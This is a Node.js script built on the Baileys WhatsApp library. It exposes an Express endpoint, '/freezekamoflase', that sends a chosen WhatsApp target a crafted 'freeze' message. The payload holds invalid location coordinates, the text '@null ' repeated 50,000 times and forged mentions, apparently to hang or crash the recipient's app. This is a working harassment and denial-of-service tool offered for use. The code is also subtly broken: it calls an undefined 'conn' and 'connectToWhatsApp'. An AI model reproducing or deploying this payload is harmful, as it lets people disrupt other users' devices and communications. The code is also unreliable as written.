const { default: makeWASocket, useMultiFileAuthState } = require('baileys');
const fs = require('fs');
const express = require('express');

const app = express();
const PORT = process.env.PORT || '3000';
const SESSION_FILE_PATH = './session.json';

app.use(express.json()); // Middleware to parse JSON bodies

async function startWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');

    const sock = makeWASocket({
        printQRInTerminal: true,
        auth: state,
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            console.log('Connection closed, reconnecting...', lastDisconnect.error);
            // Handle reconnection logic here
        } else if (connection === 'open') {
            console.log('Connection opened');
        }
    });

    // Handle other events like QR generation
}



// Function to send a freeze message
async function freezekamoflase(target) {
    await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 414058.5,
                            degreesLongitude: 131518.0 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐕2 🏴‍☠️ ${"@null ".repeat(50000)}`,
                        contextInfo: { mentionedJid: ["null@s.whatsapp.net"] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐑𝐞𝐚𝐥🦣" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

// API endpoint for freezekamoflase
app.post('/freezekamoflase', async (req, res) => {
    const { target } = req.body; // Expecting JSON with target

    if (!target) {
        return res.status(400).send('Target is required');
    }

    try {
        await freezekamoflase(target);
        res.send(`Freeze message sent to ${target}`);
    } catch (error) {
        console.error(error);
        res.status(500).send('An error occurred while sending the freeze message');
    }
});

// Start the server and connect to WhatsApp
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
    connectToWhatsApp();
});
